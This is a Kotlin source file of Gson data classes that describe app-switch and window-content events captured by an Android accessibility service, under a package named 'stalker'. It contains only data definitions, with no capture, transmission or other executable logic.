package com.askqing.stalker.model

import com.google.gson.annotations.SerializedName

/**
 * 应用切换事件
 * 无障碍服务检测到前台应用切换时生成
 */
data class AppSwitchEvent(
    @SerializedName("device_id") val deviceId: String,
    @SerializedName("timestamp") val timestamp: Long = System.currentTimeMillis(),
    @SerializedName("from_package") val fromPackage: String?,
    @SerializedName("from_app_name") val fromAppName: String?,
    @SerializedName("to_package") val toPackage: String,
    @SerializedName("to_app_name") val toAppName: String,
    @SerializedName("window_title") val windowTitle: String? = null,
    @SerializedName("duration_in_previous") val durationInPreviousMs: Long? = null
)

/**
 * 应用切换链
 * 在一个时间窗口内的连续应用切换序列
 */
data class AppSwitchChain(
    @SerializedName("device_id") val deviceId: String,
    @SerializedName("start_time") val startTime: Long,
    @SerializedName("end_time") val endTime: Long,
    @SerializedName("switches") val switches: List<AppSwitchEvent>,
    @SerializedName("total_switches") val totalSwitches: Int = switches.size,
    @SerializedName("unique_apps") val uniqueApps: Int = switches.map { it.toPackage }.distinct().size
)

/**
 * 窗口内容变化事件
 */
data class WindowContentChangeEvent(
    @SerializedName("device_id") val deviceId: String,
    @SerializedName("timestamp") val timestamp: Long = System.currentTimeMillis(),
    @SerializedName("package_name") val packageName: String,
    @SerializedName("event_type") val eventType: Int,
    @SerializedName("content_description") val contentDescription: String? = null
)
